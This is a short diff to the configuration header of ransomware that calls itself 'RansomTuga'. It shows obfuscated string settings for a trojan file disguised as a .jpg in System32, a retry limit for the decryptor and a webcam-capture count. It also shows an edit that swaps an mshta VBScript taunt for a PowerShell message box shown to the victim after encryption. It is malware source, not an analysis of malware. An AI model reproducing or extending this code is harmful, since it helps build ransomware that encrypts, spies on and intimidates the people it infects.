@@ -45,7 +45,7 @@
 #define TROJANFILE		(string)skCrypt("C:\\Windows\\System32\\trojanFile.jpg")	// filepath of the real program
 
 /* misc settings */
-#define CUSTOM_COMMAND		(string)skCrypt("mshta vbscript:Execute(\"msgbox \"\"You're fucked up!\",0,\"\"RansomTuga docet\"\":close\")")		// custom command that run after encryptions
+#define CUSTOM_COMMAND		(string)skCrypt("powershell -command \"Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('You have been fucked up by RansomTuga ransomware...', 'RansomTuga docet', 'OK', 'Error')\"")		// custom command that run after encryptions
 #define NUMBER_RETRIES		3		// maximum retries for decryptor
 #define MAX_PHOTOS			3		// maximum webcam captured
 
